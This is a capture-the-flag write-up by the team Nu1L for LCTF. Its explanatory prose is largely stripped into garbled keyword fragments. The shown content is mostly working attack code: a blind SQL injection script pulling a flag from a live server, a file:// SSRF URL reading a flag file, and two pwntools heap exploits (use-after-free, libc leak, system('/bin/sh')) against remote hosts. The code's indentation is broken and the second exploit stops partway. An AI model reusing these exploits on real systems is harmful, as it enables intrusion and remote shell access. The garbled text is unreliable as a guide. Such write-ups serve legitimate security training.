LCTF-Writeup
by Nu1L
Web
L PLAYGROUND
djdemourlssrffuzz6379
redis
nginx/static../
pycﬂagsessiondata
sessionidsessiondataﬂag
linux0fuzz0:8000CRLF
redisseturlvps302sessiondata
append
Simple blog
swpivcbcsprintf
http://211.159.161.162/test.php?
submit=%E6%8F%90%E4%BA%A4&site=ﬁle%3A%2F%2Fwww.baidu.com%2F/home/lctf/ﬂag%23
www.baidu.comlocalhost…host
preg_matchphp
phpphp config.php base64ﬂag
Pwn
Shopping?
removeitem nameUAF
import requests
dic='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._@,
{}*&^$#!=-'
table_name=''
for i in range(1,200):
    for j in dic:
        cookiess=
{"PHPSESSID":"3k9s8s0iv6dn3gq7gpaime69a7","token":"VEdsdVRKQnF5aFdCYzR3bw%3
D%3D"}
        url ="http://111.231.111.54/admin.php?
title=%1$'%20or(if((ascii(mid((select%20`f14g`%20from%20`key`),"+str(i)+",1
)))="+str(ord(j))+",0,1)=1)%23&id=1"
        resp = requests.get(url, cookies=cookiess,headers={'Content-
Type':'application/x-www-form-urlencoded'})
        if 'exist.' in resp.content:
            table_name += j
            print table_name
            break
from pwn import *
LOCAL = 0
DEBUG = 0
VERBOSE = 0
context.arch = 'amd64'
if VERBOSE:
    context.log_level = 'debug'
if LOCAL:
io = process('./shopping')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if DEBUG:
gdb.attach(io)
else:
io = remote('111.231.13.178', 20002)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def look(choice1, choice2, remark, msg=None):
io.recvuntil('your choice: ')
io.sendline('1')
io.recvuntil('[n] back\n: ')
io.sendline(choice1)
io.recvuntil('? ')
io.sendline(choice2)
io.recvuntil(': ')
io.send(remark)
if msg:
io.recvuntil('?\n')
io.send(msg)
io.recvuntil('? ')
io.sendline('n')
io.recvuntil('[n] back\n: ')
io.sendline('n')
def remove(name):
io.recvuntil('your choice: ')
io.sendline('2')
io.recvuntil('? ')
io.send(name)
for i in range(5):
look('a', 'A', '1\n')
for i in range(3):
look('a', 'A', '2\n')
io.recvuntil('your choice: ')
io.sendline('1')
io.recvuntil('[n] back\n: ')
io.sendline('a')
for i in range(91):
io.recvuntil('Which book? ')
io.sendline('A')
io.recvuntil('remark: ')
    io.send('3\n')
2ez4u
delﬂageditshowUAF
io.recvuntil('? ')
io.sendline('n')
io.recvuntil('[n] back\n: ')
io.sendline('n')
remove('1\n')
look('e', 'A', '4\n', 'A' * 208 + p64(0x0000000000400820) + '\n')
look('e', 'A', '4\n', 'A' * 208 + p64(0x0000000000400820) + '\n')
io.recvuntil('your choice: ')
io.sendline('3')
io.recvuntil('\n')
io.recvuntil('\n')
io.recvuntil('\n')
leak_libc_addr = u64(io.recvuntil('\n')[:-1] + '\x00' * 2)
libc_addr = leak_libc_addr - (0x7f5615fc7b78 - 0x7f5615c03000)
system_addr = libc_addr + libc.symbols['system']
log.info('leak_libc_addr:%#x' % leak_libc_addr)
log.info('libc_addr:%#x' % libc_addr)
remove('2\n')
look('e', 'A', '4\n', '/bin/sh\x00'.ljust(208, 'A') + p64(system_addr) + 
'\n')
io.recvuntil('your choice: ')
io.sendline('3')
io.interactive()
from pwn import *
LOCAL = 0
DEBUG = 0
VERBOSE = 0
context.arch = 'amd64'
if VERBOSE:
context.log_level = 'debug'
if LOCAL:
io = process('./2ez4u')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if DEBUG:
gdb.attach(io)
else:
io = remote('111.231.13.27', 20001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(color, value, num, desc_len, desc):
io.recvuntil('your choice: ')
io.sendline('1')
io.recvuntil('color?(0:red, 1:green):')
io.sendline(str(color))
io.recvuntil('value?(0-999):')
io.sendline(str(value))
io.recvuntil('num?(0-16):')
io.sendline(str(num))
io.recvuntil('description length?(1-1024):')
io.sendline(str(desc_len))
io.recvuntil('description of the apple:')
io.send(desc)
def delete(index):
io.recvuntil('your choice: ')
io.sendline('2')
io.recvuntil('which?(0-15):')
io.sendline(str(index))
def edit(index, color, value, num, desc):
io.recvuntil('your choice: ')
io.sendline('3')
io.recvuntil('which?(0-15):')
io.sendline(str(index))
io.recvuntil('color?(0:red, 1:green):')
io.sendline(str(color))
io.recvuntil('value?(0-999):')
io.sendline(str(value))
io.recvuntil('num?(0-16):')
io.sendline(str(num))
io.recvuntil('new description of the apple:')
io.send(desc)
def show(index):
io.recvuntil('your choice: ')
io.sendline('4')
io.recvuntil('which?(0-15):')
io.sendline(str(index))
add(1, 1, 1, 0x80, 'A\n')
add(1, 1, 1, 0x80, 'B\n')
add(1, 1, 1, 0x80, 'C\n')
add(1, 1, 1, 0x80, 'D\n')
add(1, 1, 1, 0x80, 'E\n')
delete(0)
delete(1)
add(1, 1, 1, 0x90, 'A\n')
show(1)
io.recvuntil('description:')
leak_libc_addr = u64(io.recvuntil('\n')[:-1] + '\x00' * 2)
libc_addr = leak_libc_addr - (0x7fb3e4f16b78 - 0x7fb3e4b52000)
log.info('leak_libc_addr:%#x' % leak_libc_addr)
log.info('libc_addr:%#x' % libc_addr)
delete(3)
show(1)
io.recvuntil('description:')
leak_heap_addr = u64(io.recvuntil('\n')[:-1] + '\x00' * 2)
heap_base = leak_heap_addr - (0x55cfd5d3e1e0 - 0x55cfd5d3e000)
log.info('leak_heap_addr:%#x' % leak_heap_addr)
log.info('heap_base:%#x' % heap_base)
delete(4)
delete(2)
delete(0)
add(1, 1, 1, 0x10, 'A\n')
add(1, 1, 1, 0x3F0, 'A\n')
add(1, 1, 1, 0x3F0, 'A\n')
add(1, 1, 1, 0x3F0, 'A\n')
delete(0)
delete(3)
add(1, 2, 2, 0x3d0, 'A\n')
payload = '\x00' * 0x3d0 + '\xc1\x03'
edit(3, 1, 1, 1, payload + '\n')
add(1, 1, 1, 0x3F0, 'B\n')
add(1, 1, 1, 0x10, 'C\n')
add(1, 1, 1, 0x300, 'D\n')
delete(4)
delete(5)